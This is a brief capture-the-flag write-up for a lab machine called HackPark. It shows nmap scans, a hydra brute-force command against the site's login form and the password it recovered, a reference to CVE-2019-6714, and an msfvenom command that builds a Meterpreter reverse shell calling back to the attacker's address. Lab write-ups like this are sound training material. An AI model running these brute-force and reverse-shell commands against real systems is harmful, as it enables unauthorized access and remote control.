@@ -1,0 +1,26 @@
+Write-Up of the machine HackPark
+
+First i made two scans with nmap 
+sudo nmap -sV -sC -A -T4 10.10.71.111 -Pn
+sudo nmap -p- 10.10.71.111 -Pn
+
+A webserver is running
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 8.5
+I open the web so i answer the question  
+Whats the name of the clown displayed on the homepage?
+I made a Reverse Image Search
+He's Penny Wise
+
+In the path /Account/login.aspx are a form to log into the server
+So i attack the form with Brute-Force 
+i know the user is admin, then:
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/rockyou.txt 10.10.71.111 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=tyw5PPQkZgSwSfU6B9l6MhPGccDm2PoPmawIwckCaXyTk6cPCFWwiB5UFCF15S2xRCNU0IdJuNzpd7cxWM5aKHhFYWGOFV2Na818l7c%2FrCH%2BVXR2VgjHAiuCc1hxhBcApFwdeIhIHUFyRDx8Kq7H4Lup5R89M0XzxScboYFKSuKXRoZGoYQT4qz%2F3VT%2FKRQx%2BHalUUOLBwNi%2FRYiZQcav6vU6w6OSdJA1TzjrvGpQnpfq0MNwGJ7rBDgZ4taIkWscS25CDEIN%2FI0xPOcN6EI1tMoReFXH1NfOKAJo88kdpQie4TbMf7YSqiZLfjnk6YS2f8BpJhpklRkVlG80lxkoOWQgo%2BllCTA3PVffplsprGJd5bn&__EVENTVALIDATION=GxObEnOh5fL2c7Z02z7b7A2S8wJmKbHOAEBuvgkeuR5lpKwhe0MnK1%2FnUeamsAjfEQa2a%2F%2BySjIiMQr3Z4ZkkBEBF%2FcCPjNQgYaHcKxOjlUHM2drg0NSA8mN0fV9EbpsCWS8jYX3HVRKbrqeo4FjYLiV%2FoFdoasuI187gyeGMB%2BFqKho&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24RememberMe=on&ctl00%24MainContent%24LoginUser%24LoginButton=Iniciar+sesi%C3%B3n:Login Failed" -vv
+The password is: 1qaz2wsx
+
+Inside of the server i saw a version and is vulnerable 
+CVE:
+2019-6714
+I exploit that vulnerability and inside put other reverse shell with msfvenom
+msfvenom -p windows/meterpreter/reverse_tcp -f exe -o payload.exe LHOST=10.8.56.237 LPORT=1234
+
